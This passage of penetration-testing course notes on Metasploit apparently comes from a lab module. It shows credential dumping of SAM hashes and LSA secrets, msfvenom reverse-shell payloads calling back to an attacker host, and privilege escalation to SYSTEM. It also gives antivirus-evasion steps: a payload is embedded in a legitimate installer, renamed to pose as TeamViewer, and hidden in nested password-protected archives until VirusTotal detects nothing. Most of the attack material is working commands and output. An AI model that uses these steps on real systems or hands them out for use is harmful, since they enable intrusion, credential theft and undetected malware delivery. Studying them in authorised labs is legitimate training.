<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
hashdump
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
lsa_dump_sam
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

...
```

</td>
</tr>
</table>

**MSF - Meterpreter LSA Secrets Dump**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
lsa_dump_secrets
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

...
```

</td>
</tr>
</table>

</details>

</details>

</details>

---

<details>
<summary><h2>➕ Additional Features</h2></summary>

<details>
<summary><h3>Importing Modules</h3></summary>

**Required Formatting**

- **Character Set**
  - ✅ Alphanumeric characters only (a-z, 0-9)

  - ✅ Underscores (\_) for word separation

- **Case Standard**
  - Exclusive use of snake_case (all lowercase)

  - Example: exploit/windows/http/example_module.rb

- **Prohibited Elements**
  - ❌ Hyphens (-) or spaces

  - ❌ Special characters (@, #, &, etc.)

  - ❌ Uppercase letters

- **Common Error Scenarios**
  1. Hyphen Misuse
     - ❌ Invalid: my-module.rb

     - ✅ Valid: my_module.rb

  2. Case Sensitivity
     - ❌ Invalid: MyModule.rb

     - ✅ Valid: my_module.rb

<details>
<summary><h4>Full Upgrade</h4></summary>

To incorporate community-developed modules into your Metasploit installation:

**Execute:**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfupdate
```

</td>
</tr>
</table>

This fetches all newly integrated:

- Exploit modules

- Auxiliary components

- Framework enhancements

</details>

<details>
<summary><h4>Manual</h4></summary>

1. **Source** Selection
   - Prioritize ExploitDB for verified modules

   - Filter using the "Metasploit Framework (MSF)" tag to ensure compatibility

2. **Install** by downloading module:

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
wget <EXPLOIT URL> -O /usr/share/metasploit-framework/modules/exploits/<CATEGORY>/<EXPLOIT>
```

</td>
</tr>
</table>

3. **Verify** by searching within msfconsole:

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
reload_all
search type:exploit <module_name>
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>Introduction to MSFVenom</h3></summary>

MSFVenom replaces the legacy MSFPayload and MSFEncode utilities, combining their functionality into a single powerful tool. As the modern payload generation framework for Metasploit, it enables security professionals to craft highly customizable and evasive payloads while maintaining full integration with msfconsole for exploit delivery.

<details>
<summary><h4>Creating Our Payloads</h4></summary>

**Generating Payload**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -f aspx > reverse_shell.aspx
```

</td>
</tr>
</table>

**MSF - Setting Up Multi/Handler**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfconsole -q
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use multi/handler
show options
set LHOST <ATTACKER IP>
set LPORT 4444
run
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] Started reverse TCP handler on <ATTACKER IP>:4444

[*] Sending stage (176195 bytes) to <TARGET IP>
[*] Meterpreter session 1 opened (<ATTACKER IP>:4444 -> <TARGET IP>:<TARGET PORT>) at 2020-08-28 16:33:14 +0000
```

</td>
</tr>
</table>

**Executing the Payload**

_Navigate to the upload path_ (e.g. http://TARGET/reverse_shell.aspx) to trigger the connection above.

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
getuid
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Server username: IIS APPPOOL\Web
```

</td>
</tr>
</table>

**MSF - Local Exploit Suggester**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
background
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
search local exploit suggester
use post/multi/recon/local_exploit_suggester
show options
set SESSION 1
run
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] <TARGET IP> - Collecting local exploits for x86/windows...
[*] <TARGET IP> - 31 exploit checks are being tried...
[+] <TARGET IP> - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] <TARGET IP> - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] <TARGET IP> - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] <TARGET IP> - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] <TARGET IP> - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] <TARGET IP> - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] <TARGET IP> - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] <TARGET IP>\ - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] <TARGET IP>\ - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] <TARGET IP>\ - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] <TARGET IP>\ - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] <TARGET IP>\ - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

</td>
</tr>
</table>

**MSF - Local Privilege Escalation**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
search kitrap0d
use exploit/windows/local/ms10_015_kitrap0d
show options
set LPORT 4445
set SESSION 2
run
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] Started reverse TCP handler on <ATTACKER IP>:4445
...
[*] Meterpreter session 4 opened (<ATTACKER IP>:4445 -> <TARGET IP>:<TARGET PORT>) at 2020-08-28 17:15:56 +0000
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
getuid
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Server username: NT AUTHORITY\SYSTEM
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>Firewall and IDS/IPS evasion</h3></summary>

<details>
<summary><h4>Terms</h4></summary>

To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. It is important to understand these two terms:

- **Endpoint protection:** Endpoint protection refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (DMZ).

- **Security Policies:** They are essentially a list of allow and deny statements that dictate how traffic or files can exist within a network boundary. These lists can also target different features of the network and hosts, depending on where they reside:
  - Network Traffic Policies
  - Application Policies
  - User Access Control Policies
  - File Management Policies
  - DDoS Protection Policies
  - Others

There are multiple ways to match an event or object with a security policy entry:

| Security Policy                               | Description                                                                                                                                                                                                                                                                     |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Signature-based Detection**                 | The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.                                                                                       |
| **Heuristic / Statistical Anomaly Detection** | Behavioral comparison against an established baseline, including modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline identifies the norm for the network and common protocols. Any deviation from the maximum threshold generates alarms.      |
| **Stateful Protocol Analysis Detection**      | Recognizing the divergence of protocols by comparing events against pre-built profiles of generally accepted definitions of non-malicious activity.                                                                                                                             |
| **Live-monitoring and Alerting (SOC-based)**  | A team of analysts in a dedicated (in-house or leased) SOC (Security Operations Center) uses live-feed software to monitor network activity and intermediate alarming systems for potential threats. They decide whether to act on threats or let automated mechanisms respond. |

</details>

<details>
<summary><h4>Evasion Techniques</h4></summary>

> This section covers evasion at a high level. Be on the lookout for later modules that will dig deeper into the knowledge needed to perform evasion more effectively.

<details>
<summary><h5>EXE</h5></summary>

We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -k -x ~/Downloads/GTA_SA_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ./TeamViewer_Setup.exe -i 5
```

</td>
</tr>
</table>

</details>

<details>
<summary><h5>Archives</h5></summary>

Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -k -e x86/shikata_ga_nai -a x86 --platform windows -o ./test.js -i 5
```

</td>
</tr>
</table>

If we try to view the content of the file, we will get something like this:

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
cat test.js
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
...
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

</td>
</tr>
</table>

We can inspect the file using VirusTotal

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msf-virustotal -k <API key> -f test.js
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] Using API key: <API key>
...
[*] Analysis Report: test.js (11 / 59): ...
```

</td>
</tr>
</table>

So far, we have achieved a 82% success rate, but we can achieve even more.

Let's compress the payload using rar

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```

</td>
</tr>
</table>

We can now compress the file with a password

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
rar a ~/test.rar -p ~/test.js
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Enter password (will not be echoed): ******
Reenter password: ******
...
Done
```

</td>
</tr>
</table>

At this point, we will have two files:

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ls
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
test.js   test.rar
```

</td>
</tr>
</table>

Now, we remove the .rar extension

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
mv test.rar test
ls
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
test.js   test
```

</td>
</tr>
</table>

We archive the payload one more time

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
rar a final.rar -p test
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Enter password (will not be echoed): ******
Reenter password: ******
...
Done
```

</td>
</tr>
</table>

Finally, we remove the .rar extension one more time

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
mv final.rar final
```

</td>
</tr>
</table>

After that, we can proceed to upload it on VirusTotal for another check.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msf-virustotal -k <API key> -f final
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] Using API key: <API key>
...
[*] Analysis Report: final (0 / 59): ...
```

</td>
</tr>
</table>

As we can see from the above, this is an excellent way to transfer data both to and from the target host.

</details>

<details>
<summary><h5>Packers</h5></summary>

The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

Here is a list of popular packer software:

- [UPX packer](https://upx.github.io/)
- [The Enigma Protector](https://enigmaprotector.com/)
- [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)
- Alternate EXE Packer
- ExeStealth
- Morphine
- MEW
- Themida

</details>

</details>

</details>

</details>

---

📘 **Next step:** Continue with [PASSWORD ATTACKS](./07-password-attacks.md)
